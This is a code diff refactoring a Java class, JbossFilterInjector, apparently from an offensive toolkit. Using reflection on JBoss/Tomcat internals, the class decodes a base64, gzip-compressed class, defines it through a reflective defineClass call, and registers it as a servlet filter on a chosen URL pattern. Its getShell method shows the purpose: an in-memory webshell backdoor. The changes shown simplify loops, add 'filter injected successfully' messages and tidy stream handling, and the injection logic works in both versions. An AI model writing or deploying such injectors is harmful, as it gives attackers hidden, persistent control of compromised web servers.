@@ -7,6 +7,7 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.Collection;
 import java.util.List;
 import java.util.Map;
 import java.util.zip.GZIPInputStream;
@@ -51,13 +52,11 @@ public class JbossFilterInjector {
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
                 Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                for (Object key : childrenMap.keySet()) {
-                    Map<?, ?> children = (Map<?, ?>) getFieldValue(childrenMap.get(key), "children");
-                    for (Object key1 : children.keySet()) {
-                        Object context = children.get(key1);
-                        if (context != null && context.getClass().getName().contains("StandardContext")) {
-                            contexts.add(context);
-                        }
+                Collection<?> values = childrenMap.values();
+                for (Object value : values) {
+                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
+                    for (Object context : children.values()) {
+                        contexts.add(context);
                     }
                 }
             }
@@ -67,35 +66,33 @@ public class JbossFilterInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        Object obj;
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
         try {
-            obj = classLoader.loadClass(getClassName()).newInstance();
+            return Class.forName(getClassName(), false, classLoader).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            obj = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return obj;
     }
 
     @SuppressWarnings("all")
     public void inject(Object context, Object filter) throws Exception {
-        String filterClassName = getClassName();
-        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterClassName}) != null) {
+        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
+            System.out.println("filter already injected");
             return;
         }
         Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
         Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
-        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
-        invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
+        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
+        invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
-        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
+        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
         try {
             invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
@@ -109,7 +106,8 @@ public class JbossFilterInjector {
         try {
             Object filterConfig = constructors[0].newInstance(context, filterDef);
             Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
-            filterConfigs.put(filterClassName, filterConfig);
+            filterConfigs.put(getClassName(), filterConfig);
+            System.out.println("filter injected successfully");
         } catch (Exception e) {
             // 多个应用部分应用通过上下文线程加载 filter 对象，可能在目标应用会加载不到
             if (!(e.getCause() instanceof ClassNotFoundException)) {
@@ -135,7 +133,6 @@ public class JbossFilterInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -143,16 +140,13 @@ public class JbossFilterInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
